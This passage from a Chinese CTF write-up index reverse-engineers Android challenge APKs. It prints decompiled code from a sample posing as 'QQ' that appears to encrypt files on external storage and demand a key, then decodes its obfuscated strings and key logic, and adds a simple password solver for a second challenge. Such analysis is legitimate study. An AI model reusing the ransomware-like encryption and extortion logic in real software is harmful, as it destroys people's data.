O00000Oo . setText ( OooOO0OOli . d ( \"06014F2B2A533D361C1D260001\" )); return ; } else { O0000oo0 = an . this . O0000oo0 (); d = OooOO0OOli . d ( \"040A166F2A423D201E48\" ); } Toast . makeText ( O0000oo0 , d , 0 ). show (); } }); \u70b9\u51fb\u4e8b\u4ef6\u76f8\u540c\uff0c\u7ffb\u8bd1\u5b57\u7b26\u4e32\uff1a this . O00000Oo . setOnClickListener ( new View . OnClickListener () { // from class: android.support.v4.app.an.2 @Override // android.view.View.OnClickListener public void onClick ( View view ) { O0OOOOO O0000oo0 ; String d ; if ( an . this . O000oOo ) { O0000oo0 = an . this . O0000oo0 (); d = \"The decryption has already started! Please don't touch it!\" ; } else if ( ap . O00000Oo ( am . O0000ooo , an . this . O0000O0o . getText (). toString ())) { an . this . O000oOo = true ; Toast . makeText ( an . this . O0000oo0 (), \"The key is correct and the decryption begins!\" , 0 ). show (); an . this . O00000Oo . setText ( \"In decryption\" ); return ; } else { O0000oo0 = an . this . O0000oo0 (); d = Key error ! ; } Toast . makeText ( O0000oo0 , d , 0 ). show (); } }); \u6240\u4ee5 ap.O00000Oo(am.O0000ooo, an.this.O0000O0o.getText().toString()) \u4e3atrue\u65f6\u6ee1\u8db3\u6761\u4ef6. sources/android/support/v4/app/am.java O0000oo = ap . O00000oO ( OooOO0OOli . dthis . O000O0OO ; O0000ooo = \"\" + ( Integer . parseInt ( this . O000O0OO ) + 520 ); \u6570\u636e\uff1a bacon:/data/data/com.zhuotong.kanxuectf2 # cat shared_prefs/XH.xml <?xml version='1.0' encoding='utf-8' standalone='yes' ?> <map> <int name= \"cs\" value= \"1\" /> <int name= \"sss\" value= \"1\" /> <long name= \"sj\" value= \"1660812711209\" /> <string name= \"bah\" > 10837501 </string> <long name= \"sj1\" value= \"1660467111209\" /> </map> \u6d89\u53ca\u5230native\u7684\u51fd\u6570\u6709\u5982\u4e0b\uff1a $ grep -r native resources/res/values-nb/strings.xml: <string name = \"abc_action_menu_overflow_description\" >Flere alternativer</string> sources/android/support/v4/app/OO0OOOO0.java: public static native String getRho () ; sources/android/support/v4/app/OO0OOOO0.java: public static native String getRo () ; sources/android/support/v4/app/o000000o.java: public native void o000000o0 () ; sources/android/support/v4/app/OO0OOOO.java: public native byte [] OO0OOOO ( byte [] bArr, byte [] bArr2 ) ; \u76f2\u731co000000o0\u6267\u884c\u4e86\u52a0\u5bc6\u51fd\u6570\uff0cOO0OOOO\u6267\u884c\u4e86\u89e3\u5bc6\u51fd\u6570,\u56e0\u4e3a\u89e3\u5bc6\u9700\u5bc6\u94a5\uff0c\u641c\u7d22\u5f97\u4e0a\u4e0b\u6587\uff1a 3 native\u51fd\u6570","title":"Mobile \u4e00\u7edf\u5929\u4e0b"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E4%B8%80%E7%BB%9F%E5%A4%A9%E4%B8%8B/#1","text":"jadx mysigned.apk <application android:theme= \"@style/Theme.AppCompat.Light.NoActionBar\" android:label= \"@string/app_name\" android:icon= \"@drawable/icon\" android:allowBackup= \"true\" android:supportsRtl= \"true\" > <activity android:name= \"android.support.v4.app.o000000o\" android:excludeFromRecents= \"true\" android:launchMode= \"singleInstance\" android:windowSoftInputMode= \"adjustPan\" > <intent-filter> <action android:name= \"android.intent.action.MAIN\" /> <category android:name= \"android.intent.category.LAUNCHER\" /> </intent-filter> </activity> <activity-alias android:label= \"@string/second_activity_name\" android:icon= \"@drawable/baah\" android:name= \"android.support.v4.app.Q496512831\" android:enabled= \"false\" android:excludeFromRecents= \"true\" android:launchMode= \"singleInstance\" android:targetActivity= \"android.support.v4.app.o000000o\" > <intent-filter> <action android:name= \"android.intent.action.MAIN\" /> <category android:name= \"android.intent.category.LAUNCHER\" /> </intent-filter> </activity-alias> <provider android:name= \"android.support.v4.app.OO0OOOO0\" android:authorities= \"com.zhuotong.net\" /> </application> sources/android/support/v4/app/o000000o.java import android.support.v7.app.O0000O0o ; public class o000000o extends O0000O0o { static { System . loadLibrary ( OooOO0OOli . d ( \"22161E3B2A433B\" )); } public native void o000000o0 (); public void onCreate ( Bundle bundle ) { getWindow (). addFlags ( 1024 ); this . O000O00o = getApplicationContext (). getPackageManager (); super . onCreate ( bundle ); setContentView ( R . layout . home ); O0000oOo = this ; O0000OoO (). O000000o (). O00000Oo ( R . id . frame_content , new O0OOO0O ()). O0000Oo0 (); SharedPreferences sharedPreferences = getSharedPreferences ( OooOO0OOli . d ( \"1727\" ), 0 ); if ( sharedPreferences . getString ( OooOO0OOli . d ( \"2D0E07\" ), \"\" ). equals ( \"\" )) { this . O000O0OO = \"\" + ((( int ) ( Math . random () * 1000000.0d )) + 10000000 ); SharedPreferences . Editor edit = sharedPreferences . edit (); edit . putString ( OooOO0OOli . d ( \"2D0E07\" ), this . O000O0OO ); edit . commit (); } else { this . O000O0OO = sharedPreferences . getString ( OooOO0OOli . d ( \"2D0E07\" ), \"\" ); } O0000oo = OO0o0 . O00000oO ( OooOO0OOli . dthis . O000O0OO ; O0000ooo = \"\" + ( Integer . parseInt ( this . O000O0OO ) + 520 ); O0000ooO = O0000oo . length (); O0000oo0 = new File ( String . valueOf ( Environment . getExternalStorageDirectory ()) + OooOO0OOli . d ( \"60\" )); if ( sharedPreferences . getInt ( OooOO0OOli . d ( \"3C1C1C\" ), 0 ) == 0 ) { new Thread ( new Runnable () { // from class: android.support.v4.app.o000000o.1 @Override // java.lang.Runnable public void run () { OO0o0 . O000000o ( o000000o . O0000oo0 . toString (), o000000o . O0000ooo , 1 , o000000o . this ); } }). start (); return ; } setTitle ( OooOO0OOli . d ( \"1E3E\" )); O0000OoO (). O000000o (). O00000Oo ( R . id . frame_content , new OO00O0 ()). O0000Oo0 (); o000000o0 (); } @Override // android.support.v7.app.O0000O0o, android.app.Activity, android.view.KeyEvent.Callback public boolean onKeyDown ( int i , KeyEvent keyEvent ) { if ( i == 4 ) { Toast . makeText ( this , O0000OoO (). O000000o ( R . id . frame_content ) instanceof O0OOO0O ? OooOO0OOli . d ( \"A6EAE2A8F29EA9D9EB8DF4D98BF7E210A7E0DB8CC4D086CFCFD5C8F583D5CE\" ) : OooOO0OOli . d ( \"1F030A2E3C556F2B034921001B6F3E45263B4C1D270A4F3C20563B380D1B2A434F203D103B2709492906032A6F5D2E364C072A190A3D6F522A6F1E0C2C00192A3D552B6E\" ), 1 ). show (); } return true ; } /* JADX INFO: Access modifiers changed from: protected */ @Override // android.support.v4.app.O0OOOOO, android.app.Activity public void onPause () { String d ; if ( O0000OoO (). O000000o ( R . id . frame_content ) instanceof O0OOO0O ) { SharedPreferences sharedPreferences = getSharedPreferences ( OooOO0OOli . d ( \"1727\" ), 0 ); SharedPreferences . Editor edit = sharedPreferences . edit (); edit . putInt ( OooOO0OOli . d ( \"2C1C\" ), sharedPreferences . getInt ( OooOO0OOli . d ( \"2C1C\" ), 0 ) + 1 ); edit . commit (); d = OooOO0OOli . d ( \"A6EAE2A8F29EA9D9EB8DF4D98BF7E210A7E0DB8CC4D086CFCFD5C8F583D5CE\" ); } else { d = OooOO0OOli . d ( \"1F030A2E3C556F2B034921001B6F3E45263B4C1D270A4F3C20563B380D1B2A434F203D103B2709492906032A6F5D2E364C072A190A3D6F522A6F1E0C2C00192A3D552B6E\" ); } Toast . makeText ( this , d , 1 ). show (); super . onPause (); } /* JADX INFO: Access modifiers changed from: protected */ @Override // android.support.v4.app.O0OOOOO, android.app.Activity public void onResume () { if (( O0000OoO (). O000000o ( R . id . frame_content ) instanceof O0OOO0O ) && getSharedPreferences ( OooOO0OOli . d ( \"1727\" ), 0 ). getInt ( OooOO0OOli . d ( \"2C1C\" ), 0 ) >= 2 ) { setTitle ( OooOO0OOli . d ( \"1E3E\" )); O0000OoO (). O000000o (). O00000Oo ( R . id . frame_content , new OO00O0 ()). O0000Oo0 (); } super . onResume (); } \u5e03\u5c40 ./resources/res/layout/home.xml <? xml version = \"1.0\" encoding = \"utf-8\" ?> < LinearLayout xmlns : android = \"http://schemas.android.com/apk/res/android\" android : gravity = \"center\" android : id = \"@+id/ll\" android : layout_width = \"match_parent\" android : layout_height = \"match_parent\" > < FrameLayout android : id = \"@+id/frame_content\" android : layout_width = \"match_parent\" android : layout_height = \"match_parent\" /> </ LinearLayout > frame_content \u76f8\u5173\u5185\u5bb9 $ grep -r frame_content Binary file resources/classes.dex matches resources/res/values/public.xml: <public type = \"id\" name = \"frame_content\" id = \"0x7f070044\" /> resources/res/layout/home.xml: <FrameLayout android:id = \"@+id/frame_content\" android:layout_width = \"match_parent\" android:layout_height = \"match_parent\" /> sources/com/zhuotong/kanxuectf2/R.java: public static final int frame_content = 0x7f070044 ; sources/android/support/v4/app/am.java: O0000OoO () .O000000o () .O00000Oo ( R.id.frame_content, new al ()) .O0000Oo0 () ; sources/android/support/v4/app/am.java: O0000OoO () .O000000o () .O00000Oo ( R.id.frame_content, new an ()) .O0000Oo0 () ; sources/android/support/v4/app/am.java: Toast.makeText ( this, O0000OoO () .O000000o ( R.id.frame_content ) instanceof al ? OooOO0OOli.d ( \"A6EAE2A8F29EA9D9EB8DF4D98BF7E210A7E0DB8CC4D086CFCFD5C8F583D5CE\" ) : OooOO0OOli.d ( \"1F030A2E3C556F2B034921001B6F3E45263B4C1D270A4F3C20563B380D1B2A434F203D103B2709492906032A6F5D2E364C072A190A3D6F522A6F1E0C2C00192A3D552B6E\" ) , 1 ) .show () ; sources/android/support/v4/app/am.java: if ( O0000OoO () .O000000o ( R.id.frame_content ) instanceof al ) { sources/android/support/v4/app/am.java: if (( O0000OoO () .O000000o ( R.id.frame_content ) instanceof al ) && getSharedPreferences ( OooOO0OOli.d ( \"1727\" ) , 0 ) .getInt ( OooOO0OOli.d ( \"2C1C\" ) , 0 ) > = 2 ) { sources/android/support/v4/app/am.java: O0000OoO () .O000000o () .O00000Oo ( R.id.frame_content, new an ()) .O0000Oo0 () ; sources/android/support/v4/app/ao.java: public static final int frame_content = 2131165252 ; sources/android/support/v4/app/o000000o.java: O0000OoO () .O000000o () .O00000Oo ( R.id.frame_content, new O0OOO0O ()) .O0000Oo0 () ; sources/android/support/v4/app/o000000o.java: O0000OoO () .O000000o () .O00000Oo ( R.id.frame_content, new OO00O0 ()) .O0000Oo0 () ; sources/android/support/v4/app/o000000o.java: Toast.makeText ( this, O0000OoO () .O000000o ( R.id.frame_content ) instanceof O0OOO0O ? OooOO0OOli.d ( \"A6EAE2A8F29EA9D9EB8DF4D98BF7E210A7E0DB8CC4D086CFCFD5C8F583D5CE\" ) : OooOO0OOli.d ( \"1F030A2E3C556F2B034921001B6F3E45263B4C1D270A4F3C20563B380D1B2A434F203D103B2709492906032A6F5D2E364C072A190A3D6F522A6F1E0C2C00192A3D552B6E\" ) , 1 ) .show () ; sources/android/support/v4/app/o000000o.java: if ( O0000OoO () .O000000o ( R.id.frame_content ) instanceof O0OOO0O ) { sources/android/support/v4/app/o000000o.java: if (( O0000OoO () .O000000o ( R.id.frame_content ) instanceof O0OOO0O ) && getSharedPreferences ( OooOO0OOli.d ( \"1727\" ) , 0 ) .getInt ( OooOO0OOli.d ( \"2C1C\" ) , 0 ) > = 2 ) { sources/android/support/v4/app/o000000o.java: O0000OoO () .O000000o () .O00000Oo ( R.id.frame_content, new OO00O0 ()) .O0000Oo0 () ; ./sources/defpackage/OooOO0OOli.java $ find . -name OooOO0OOli.java ./sources/defpackage/OooOO0OOli.java ./sources/defpackage/OooOO0OOli.java package defpackage ; import java.io.ByteArrayOutputStream ; /* renamed from: OooOO0OOli reason: default package */ /* loaded from: classes.dex */ public class OooOO0OOli { private static final String KEY = \"OooOO0OOli\" ; private static final String hexString = \"0123456789ABCDEF\" ; public static String d ( String str ) { ByteArrayOutputStream baos = new ByteArrayOutputStream ( str . length () / 2 ); for ( int i = 0 ; i < str . length (); i += 2 ) { baos . write (( hexString . indexOf ( str . charAt ( i )) << 4 ) | hexString . indexOf ( str . charAt ( i + 1 ))); } byte [] b = baos . toByteArray (); int len = b . length ; int keyLen = KEY . length (); for ( int i2 = 0 ; i2 < len ; i2 ++ ) { b [ i2 ] = ( byte ) ( b [ i2 ] ^ KEY . charAt ( i2 % keyLen )); } return new String ( b ); } }","title":"1 \u9006\u5411"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E4%B8%80%E7%BB%9F%E5%A4%A9%E4%B8%8B/#2-ooooo0oolid","text":"sources/android/support/v4/app/o000000o.java import android.support.v7.app.O0000O0o ; public class o000000o extends O0000O0o { static { System . loadLibrary ( \"myqtest\" ); } public native void o000000o0 (); public void onCreate ( Bundle bundle ) { getWindow (). addFlags ( 1024 ); this . O000O00o = getApplicationContext (). getPackageManager (); super . onCreate ( bundle ); setContentView ( R . layout . home ); O0000oOo = this ; O0000OoO (). O000000o (). O00000Oo ( R . id . frame_content , new O0OOO0O ()). O0000Oo0 (); SharedPreferences sharedPreferences = getSharedPreferences ( \"XH\" , 0 ); if ( sharedPreferences . getString ( \"bah\" , \"\" ). equals ( \"\" )) { this . O000O0OO = \"\" + ((( int ) ( Math . random () * 1000000.0d )) + 10000000 ); SharedPreferences . Editor edit = sharedPreferences . edit (); edit . putString ( \"bah\" , this . O000O0OO ); edit . commit (); } else { this . O000O0OO = sharedPreferences . getString ( \"bah\" , \"\" ); } O0000oo = OO0o0 . O00000oO ( \"\u17d7\u1782\u17d1\u178f\u17d7\u1782\u17d1\u178e\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u1790\u17d7\u1782\u179a\u17d7\u17d7\u1782\u179a\u17d5\u17d7\u1782\u179a\u17c8\u17d7\u1782\u179a\u17d1\u17d7\u1782\u179a\u17d6\u17d7\u1782\u179a\u17c8\u17d7\u1782\u179a\u17d4\u17d7\u1782\u179a\u17da\u17d7\u1782\u179a\u17cc\u17d7\u1782\u179a\u17da\u17d7\u1782\u17d1\u1785\u17d7\u1782\u17d1\u1785\u17d6\u17a8\u1782\u1796\u17d6\u17aa\u17ac\u17aa\u17d5\u17ba\u1796\u1797\u17e9\u17d6\u17b9\u1786\u17d7\u17d5\u17b9\u17a4\u178b\u17d5\u17b9\u17a4\u1799\u17d6\u17a8\u17a4\u17d1\u17d6\u17a8\u1786\u179b\u17d7\u1782\u179a\u1784\u17e9\" ) + this . O000O0OO ; O0000ooo = \"\" + ( Integer . parseInt ( this . O000O0OO ) + 520 ); O0000ooO = O0000oo . length (); O0000oo0 = new File ( String . valueOf ( Environment . getExternalStorageDirectory ()) + \"/\" ); if ( sharedPreferences . getInt ( \"sss\" , 0 ) == 0 ) { new Thread ( new Runnable () { // from class: android.support.v4.app.o000000o.1 @Override // java.lang.Runnable public void run () { OO0o0 . O000000o ( o000000o . O0000oo0 . toString (), o000000o . O0000ooo , 1 , o000000o . this ); } }). start (); return ; } setTitle ( \"QQ\" ); O0000OoO (). O000000o (). O00000Oo ( R . id . frame_content , new OO00O0 ()). O0000Oo0 (); o000000o0 (); } @Override // android.support.v7.app.O0000O0o, android.app.Activity, android.view.KeyEvent.Callback public boolean onKeyDown ( int i , KeyEvent keyEvent ) { if ( i == 4 ) { Toast . makeText ( this , O0000OoO (). O000000o ( R . id . frame_content ) instanceof O0OOO0O ? \"\u914d\u7f6e\u6587\u4ef6\u4e2d \u8bf7\u52ff\u9000\u51fa\uff01\" : \"Please do not quit the software, or the file may never be recovered!\" , 1 ). show (); } return true ; } /* JADX INFO: Access modifiers changed from: protected */ @Override // android.support.v4.app.O0OOOOO, android.app.Activity public void onPause () { String d ; if ( O0000OoO (). O000000o ( R . id . frame_content ) instanceof O0OOO0O ) { SharedPreferences sharedPreferences = getSharedPreferences ( \"XH\" , 0 ); SharedPreferences . Editor edit = sharedPreferences . edit (); edit . putInt ( OooOO0OOli . d ( \"2C1C\" ), sharedPreferences . getInt ( \"cs\" , 0 ) + 1 ); edit . commit (); d = \"\u914d\u7f6e\u6587\u4ef6\u4e2d \u8bf7\u52ff\u9000\u51fa\uff01\" ; } else { d = \"Please do not quit the software, or the file may never be recovered!\" ; } Toast . makeText ( this , d , 1 ). show (); super . onPause (); } /* JADX INFO: Access modifiers changed from: protected */ @Override // android.support.v4.app.O0OOOOO, android.app.Activity public void onResume () { if (( O0000OoO (). O000000o ( R . id . frame_content ) instanceof O0OOO0O ) && getSharedPreferences ( \"XH\" , 0 ). getInt ( \"cs\" , 0 ) >= 2 ) { setTitle ( \"QQ\" ); O0000OoO (). O000000o (). O00000Oo ( R . id . frame_content , new OO00O0 ()). O0000Oo0 (); } super . onResume (); } \u4ece\u4e0a\u8ff0\u7ed3\u6784\u770b\uff0c\u9875\u9762\u52a0\u8f7d\u4e86 ./sources/android/support/v4/app/OO00O0.java \u8fd9\u4e2a Fragment \u6839\u636e\u754c\u9762\u641c enter your key $ grep -r \"enter your key\" resources/res/layout/main.xml: <EditText android:textSize = \"13sp\" android:id = \"@+id/ed\" android:background = \"@null\" android:focusable = \"false\" android:layout_width = \"0dp\" android:layout_height = \"match_parent\" android:hint = \"Please enter your key!\" android:cursorVisible = \"false\" android:ems = \"10\" android:maxLength = \"50\" android:digits = \"dc2hfygemabl08w{}\" android:layout_weight = \"7\" /> \u4e0a\u4e0b\u6587 resources/res/layout/main.xml <LinearLayout android:orientation= \"horizontal\" android:layout_width= \"match_parent\" android:layout_height= \"0dp\" android:layout_marginBottom= \"3dp\" android:weightSum= \"10\" android:layout_weight= \"2\" > <EditText android:textSize= \"13sp\" android:id= \"@+id/ed\" android:background= \"@null\" android:focusable= \"false\" android:layout_width= \"0dp\" android:layout_height= \"match_parent\" android:hint= \"Please enter your key!\" android:cursorVisible= \"false\" android:ems= \"10\" android:maxLength= \"50\" android:digits= \"dc2hfygemabl08w{}\" android:layout_weight= \"7\" /> <Button android:enabled= \"false\" android:textSize= \"10sp\" android:textColor= \"#ff000000\" android:id= \"@+id/bt\" android:layout_width= \"0dp\" android:layout_height= \"wrap_content\" android:text= \"Cannot decrypt\" android:layout_weight= \"3\" android:textAllCaps= \"false\" /> </LinearLayout> hamilton@hamilton-Lenovo-G470:~/Downloads/mysigned$ grep -r \"R.id.bt\" sources/android/support/v4/app/OO00O0.java: this.O00000Oo = ( Button ) this.O000oOO0.findViewById ( R.id.bt ) ; sources/android/support/v4/app/OO00O0.java: this.O00000o0 = ( TextView ) this.O000oOO0.findViewById ( R.id.bt1 ) ; sources/android/support/v4/app/OO00O0.java: this.O00000o = ( TextView ) this.O000oOO0.findViewById ( R.id.bt2 ) ; sources/android/support/v4/app/OO00O0.java: this.O00000oO = ( TextView ) this.O000oOO0.findViewById ( R.id.bt3 ) ; sources/android/support/v4/app/OO00O0.java: this.O00000oo = ( TextView ) this.O000oOO0.findViewById ( R.id.bt4 ) ; sources/android/support/v4/app/an.java: this.O00000Oo = ( Button ) this.O000oOO0.findViewById ( R.id.bt ) ; sources/android/support/v4/app/an.java: this.O00000o0 = ( TextView ) this.O000oOO0.findViewById ( R.id.bt1 ) ; sources/android/support/v4/app/an.java: this.O00000o = ( TextView ) this.O000oOO0.findViewById ( R.id.bt2 ) ; sources/android/support/v4/app/an.java: this.O00000oO = ( TextView ) this.O000oOO0.findViewById ( R.id.bt3 ) ; sources/android/support/v4/app/an.java: this.O00000oo = ( TextView ) this.O000oOO0.findViewById ( R.id.bt4 ) ; hamilton@hamilton-Lenovo-G470:~/Downloads/mysigned$ grep -r \"R.layout.main\" sources/android/support/v4/app/OO00O0.java: this.O000oOO0 = layoutInflater.inflate ( R.layout.main, viewGroup, false ) ; sources/android/support/v4/app/an.java: this.O000oOO0 = layoutInflater.inflate ( R.layout.main, viewGroup, false ) ; sources/android/support/v4/app/al.java: View inflate = layoutInflater.inflate ( R.layout.main1, viewGroup, false ) ; sources/android/support/v4/app/O0OOO0O.java: View inflate = layoutInflater.inflate ( R.layout.main1, viewGroup, false ) ; bt\u5728 sources/android/support/v4/app/OO00O0.java \u548c sources/android/support/v4/app/an.java \u4e2d\u51fa\u73b0\uff1a sources/android/support/v4/app/OO00O0.java \u70b9\u51fb\u4e8b\u4ef6\uff1a this . O00000Oo . setOnClickListener ( new View . OnClickListener () { // from class: android.support.v4.app.OO00O0.2 @Override // android.view.View.OnClickListener public void onClick ( View view ) { O0OOOOO O0000oo0 ; String d ; if ( OO00O0 . this . O000oOo ) { O0000oo0 = OO00O0 . this . O0000oo0 (); d = OooOO0OOli . d ( \"1B070A6F2B552C3D15193B0600216F582E3C4C08231D0A2E2B496F3C18083D1B0A2B6E101F2309083C0A4F2B205E683B4C1D201A0C276F593B6E\" ); } else if ( OO0o0 . O00000Oo ( o000000o . O0000ooo , OO00O0 . this . O0000O0o . getText (). toString ())) { OO00O0 . this . O000oOo = true ; Toast . makeText ( OO00O0 . this . O0000oo0 (), OooOO0OOli . d ( \"1B070A6F2455366F051A6F0C003D3D552C3B4C08210B4F3B27556F2B090A3D161F3B265F216F0E0C2806013C6E\" ), 0 ). show (); OO00O0 . this . O00000Oo . setText ( OooOO0OOli . d ( \"06014F2B2A533D361C1D260001\" )); return ; } else { O0000oo0 = OO00O0 . this . O0000oo0 (); d = OooOO0OOli . d ( \"040A166F2A423D201E48\" ); } Toast . makeText ( O0000oo0 , d , 0 ). show (); } }); sources/android/support/v4/app/an.java \u70b9\u51fb\u4e8b\u4ef6 this . O00000Oo . setOnClickListener ( new View . OnClickListener () { // from class: android.support.v4.app.an.2 @Override // android.view.View.OnClickListener public void onClick ( View view ) { O0OOOOO O0000oo0 ; String d ; if ( an . this . O000oOo ) { O0000oo0 = an . this . O0000oo0 (); d = OooOO0OOli . d ( \"1B070A6F2B552C3D15193B0600216F582E3C4C08231D0A2E2B496F3C18083D1B0A2B6E101F2309083C0A4F2B205E683B4C1D201A0C276F593B6E\" ); } else if ( ap . O00000Oo ( am . O0000ooo , an . this . O0000O0o . getText (). toString ())) { an . this . O000oOo = true ; Toast . makeText ( an . this . O0000oo0 (), OooOO0OOli . d ( \"1B070A6F2455366F051A6F0C003D3D552C3B4C08210B4F3B27556F2B090A3D161F3B265F216F0E0C2806013C6E\" ), 0 ). show (); an . this . O00000Oo . setText ( OooOO0OOli . d ( \"06014F2B2A533D361C1D260001\" )); return ; } else { O0000oo0 = an . this . O0000oo0 (); d = OooOO0OOli . d ( \"040A166F2A423D201E48\" ); } Toast . makeText ( O0000oo0 , d , 0 ). show (); } }); \u70b9\u51fb\u4e8b\u4ef6\u76f8\u540c\uff0c\u7ffb\u8bd1\u5b57\u7b26\u4e32\uff1a this . O00000Oo . setOnClickListener ( new View . OnClickListener () { // from class: android.support.v4.app.an.2 @Override // android.view.View.OnClickListener public void onClick ( View view ) { O0OOOOO O0000oo0 ; String d ; if ( an . this . O000oOo ) { O0000oo0 = an . this . O0000oo0 (); d = \"The decryption has already started! Please don't touch it!\" ; } else if ( ap . O00000Oo ( am . O0000ooo , an . this . O0000O0o . getText (). toString ())) { an . this . O000oOo = true ; Toast . makeText ( an . this . O0000oo0 (), \"The key is correct and the decryption begins!\" , 0 ). show (); an . this . O00000Oo . setText ( \"In decryption\" ); return ; } else { O0000oo0 = an . this . O0000oo0 (); d = Key error ! ; } Toast . makeText ( O0000oo0 , d , 0 ). show (); } }); \u6240\u4ee5 ap.O00000Oo(am.O0000ooo, an.this.O0000O0o.getText().toString()) \u4e3atrue\u65f6\u6ee1\u8db3\u6761\u4ef6. sources/android/support/v4/app/am.java O0000oo = ap . O00000oO ( OooOO0OOli . dthis . O000O0OO ; O0000ooo = \"\" + ( Integer . parseInt ( this . O000O0OO ) + 520 ); \u6570\u636e\uff1a bacon:/data/data/com.zhuotong.kanxuectf2 # cat shared_prefs/XH.xml <?xml version='1.0' encoding='utf-8' standalone='yes' ?> <map> <int name= \"cs\" value= \"1\" /> <int name= \"sss\" value= \"1\" /> <long name= \"sj\" value= \"1660812711209\" /> <string name= \"bah\" > 10837501 </string> <long name= \"sj1\" value= \"1660467111209\" /> </map> \u6d89\u53ca\u5230native\u7684\u51fd\u6570\u6709\u5982\u4e0b\uff1a $ grep -r native resources/res/values-nb/strings.xml: <string name = \"abc_action_menu_overflow_description\" >Flere alternativer</string> sources/android/support/v4/app/OO0OOOO0.java: public static native String getRho () ; sources/android/support/v4/app/OO0OOOO0.java: public static native String getRo () ; sources/android/support/v4/app/o000000o.java: public native void o000000o0 () ; sources/android/support/v4/app/OO0OOOO.java: public native byte [] OO0OOOO ( byte [] bArr, byte [] bArr2 ) ; \u76f2\u731co000000o0\u6267\u884c\u4e86\u52a0\u5bc6\u51fd\u6570\uff0cOO0OOOO\u6267\u884c\u4e86\u89e3\u5bc6\u51fd\u6570,\u56e0\u4e3a\u89e3\u5bc6\u9700\u5bc6\u94a5\uff0c\u641c\u7d22\u5f97\u4e0a\u4e0b\u6587\uff1a","title":"2 OooOO0OOli.d\u7ed3\u679c"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E4%B8%80%E7%BB%9F%E5%A4%A9%E4%B8%8B/#3-native","text":"","title":"3 native\u51fd\u6570"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E5%9F%BA%E7%A1%80android/","text":"1 \u9898\u76ee wget https://adworld.xctf.org.cn/media/file/task/6a0484a135bb44ba8fdcf829b5d9865b.apk jadx 6a0484a135bb44ba8fdcf829b5d9865b.apk resources/AndroidManifest.xml <?xml version=\"1.0\" encoding=\"utf-8\"?> <manifest xmlns:android= \"http://schemas.android.com/apk/res/android\" android:versionCode= \"1\" android:versionName= \"1.0\" package= \"com.example.test.ctf02\" platformBuildVersionCode= \"24\" platformBuildVersionName= \"7\" > <uses-sdk android:minSdkVersion= \"14\" android:targetSdkVersion= \"24\" /> <application android:theme= \"@style/AppTheme\" android:label= \"@string/app_name\" android:icon= \"@mipmap/ic_launcher\" android:debuggable= \"true\" android:allowBackup= \"true\" android:supportsRtl= \"true\" > <activity android:name= \"com.example.test.ctf02.MainActivity\" > <intent-filter> <action android:name= \"android.intent.action.MAIN\" /> <category android:name= \"android.intent.category.LAUNCHER\" /> </intent-filter> </activity> <receiver android:name= \"com.example.test.ctf02.GetAndChange\" android:enabled= \"true\" android:exported= \"true\" > <intent-filter> <action android:name= \"android.is.very.fun\" /> </intent-filter> </receiver> <activity android:name= \"com.example.test.ctf02.NextContent\" /> <activity android:name= \"com.example.test.ctf02.MainActivity2\" /> </application> </manifest> 2 MainActivity sources/com/example/test/ctf02/MainActivity.java @Override // android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.support.v4.app.BaseFragmentActivityGingerbread, android.app.Activity public void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView ( R . layout . acticity_main_1 ); this . passWord = ( EditText ) findViewById ( R . id . passWord ); this . login = ( Button ) findViewById ( R . id . button ); this . login . setOnClickListener ( new View . OnClickListener () { // from class: com.example.test.ctf02.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick ( View v ) { String str = MainActivity . this . passWord . getText (). toString (); Check check = new Check (); if ( check . checkPassword ( str )) { Toast . makeText ( MainActivity . this , \"Good,Please go on!\" , 0 ). show (); Intent intent = new Intent ( MainActivity . this , MainActivity2 . class ); MainActivity . this . startActivity ( intent ); MainActivity . this . finish (); return ; } Toast . makeText ( MainActivity . this , \"Failed\" , 0 ). show (); } }); } ./sources/com/example/test/ctf02/Check.java package com.example.test.ctf02 ; /* loaded from: classes.dex */ public class Check { public boolean checkPassword ( String str ) { char [] pass = str . toCharArray (); if ( pass . length != 12 ) { return false ; } for ( int len = 0 ; len < pass . length ; len ++ ) { pass [ len ] = ( char ) ((( 255 - len ) - 100 ) - pass [ len ] ); if ( pass [ len ] != '0' || len >= 12 ) { return false ; } } return true ; } } \u4ece\u4e0a\u6587\u53ef\u77e5\uff1a\u3000\u8f93\u5165\u7684\u5bc6\u7801\u4f7f Check \u7684 checkPassword \u51fd\u6570\u8fd4\u56detrue\uff0c\u5219\u8df3\u8f6c MainActivity2 exp1.py \uff1a pwd = [] plen = 12 for i in range ( plen ): pwd . append ( ( ( 255 - i ) - 100 ) - ord ( '0' )) print ( bytes ( pwd )) # b'kjihgfedcba`' 3 MainActivity2 sources/com/example/test/ctf02/MainActivity2.java @Override // android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.support.v4.app.BaseFragmentActivityGingerbread, android.app.Activity public void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView ( R . layout . activity_main_2 ); init (); this . button . setOnClickListener ( new View . OnClickListener () { // from class: com.example.test.ctf02.MainActivity2.1 @Override // android.view.View.OnClickListener public void onClick ( View v ) { String str = MainActivity2 . this . editText . getText (). toString (); Intent intent = new Intent ( str ); MainActivity2 . this . sendBroadcast ( intent ); } }); } public void init () { this . imageView = ( ImageView ) findViewById ( R . id . image ); this . imageView . setImageResource ( R . drawable . timg ); this . editText = ( EditText ) findViewById ( R . id . pwd ); this . button = ( Button ) findViewById ( R . id . button ); } ./sources/com/example/test/ctf02/GetAndChange.java public class GetAndChange extends BroadcastReceiver { @Override // android.content.BroadcastReceiver public void onReceive ( Context context , Intent intent ) { Intent intent1 = new Intent ( context , NextContent . class ); context . startActivity ( intent1 ); } } 4 NextContent ./sources/com/example/test/ctf02/NextContent.java public class NextContent extends AppCompatActivity { ImageView imageView ; /* JADX INFO: Access modifiers changed from: protected */ @Override // android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.support.v4.app.BaseFragmentActivityGingerbread, android.app.Activity public void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView ( R . layout . activity_next_content ); init (); Change (); } public void init () { this . imageView = ( ImageView ) findViewById ( R . id . imageview ); } public void Change () { String strFile = 